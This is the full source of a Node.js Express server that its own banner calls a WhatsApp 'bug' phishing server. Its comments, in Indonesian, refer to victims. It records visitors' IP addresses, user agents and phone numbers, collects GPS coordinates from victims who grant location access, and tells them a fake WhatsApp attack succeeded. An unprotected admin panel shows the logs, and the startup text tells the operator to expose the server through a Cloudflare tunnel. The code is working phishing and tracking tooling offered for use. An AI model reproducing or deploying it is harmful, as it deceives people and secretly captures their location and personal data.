const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// Data store
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const logVisit = (req, data = {}) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    const userAgent = req.headers['user-agent'];
    const sessionId = 'ws-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    
    const visitData = {
        sessionId,
        ip,
        userAgent,
        screen: data.screen || 'Unknown',
        timestamp: new Date().toLocaleString('id-ID'),
        action: data.action || 'visit',
        phone: data.phone || null,
        bugMethod: data.method || null,
        gps: data.gps || null,
        accuracy: data.accuracy || null,
        url: req.originalUrl
    };
    
    console.log(`[+] NEW VISITOR: ${ip} | ${visitData.screen} | ${visitData.action}`);
    
    const logFile = path.join(DATA_DIR, `visits_${new Date().toISOString().split('T')[0]}.json`);
    let logs = [];
    if (fs.existsSync(logFile)) {
        logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
    }
    logs.push(visitData);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    
    // Also log to a main file for admin panel
    const mainLog = path.join(DATA_DIR, 'master_log.jsonl');
    fs.appendFileSync(mainLog, JSON.stringify(visitData) + '\n');
    
    return visitData;
};

// Routes
app.get('/', (req, res) => {
    const data = logVisit(req, { screen: req.query.screen || 'Unknown', action: 'landing' });
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/get-location', (req, res) => {
    // Endpoint untuk JS di frontend kirim GPS jika korban allow
    const { lat, lng, accuracy, phone, method } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    console.log(`[!] LOCATION CAPTURED: ${phone} | ${lat},${lng} | ${accuracy}m`);
    
    const gpsData = {
        phone,
        method,
        coordinates: { lat, lng },
        accuracy,
        ip,
        timestamp: new Date().toLocaleString('id-ID'),
        maps: `https://maps.google.com/?q=${lat},${lng}`
    };
    
    const gpsFile = path.join(DATA_DIR, 'gps_captures.jsonl');
    fs.appendFileSync(gpsFile, JSON.stringify(gpsData) + '\n');
    
    logVisit(req, {
        screen: 'GPS',
        action: 'gps_capture',
        phone,
        method,
        gps: `${lat},${lng}`,
        accuracy
    });
    
    res.json({ success: true, message: 'Bug sedang diproses...' });
});

app.post('/api/send-bug', (req, res) => {
    // Ketika korban klik "Send Bug"
    const { phone, method } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    console.log(`[!] BUG ATTEMPT: ${phone} | Method: ${method} | IP: ${ip}`);
    
    logVisit(req, {
        screen: req.body.screen || 'Unknown',
        action: 'bug_attempt',
        phone,
        method
    });
    
    // Simulasi "proses bug" (ini palsu, tapi korban dikasih loading)
    res.json({
        success: true,
        message: `Bug ${method} berhasil dikirim ke ${phone}! Tunggu 5-10 menit untuk efek. Jangan buka WhatsApp target.`
    });
});

app.get('/admin', (req, res) => {
    // Simple admin panel
    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

app.get('/admin/data', (req, res) => {
    const masterLog = path.join(DATA_DIR, 'master_log.jsonl');
    let data = [];
    if (fs.existsSync(masterLog)) {
        const lines = fs.readFileSync(masterLog, 'utf8').trim().split('\n');
        data = lines.map(line => JSON.parse(line));
    }
    res.json(data);
});

// Start server
app.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════╗
    ║    WHATSAPP BUG PHISHING SERVER       ║
    ║    Created by Ditzz                   ║
    ║    v2.0.0                             ║
    ╚═══════════════════════════════════════╝
    
    [#] Server aktif di port: ${PORT}
    [#] Data Dir: ${DATA_DIR}
    [#] Local URL: http://localhost:${PORT}
    [#] Admin Panel: http://localhost:${PORT}/admin
    
    [!] Jalankan Cloudflare Tunnel di terminal lain:
        $ cd ~/whatsapp-bug
        $ ./cloudflared tunnel --url http://localhost:${PORT}
    `);
});
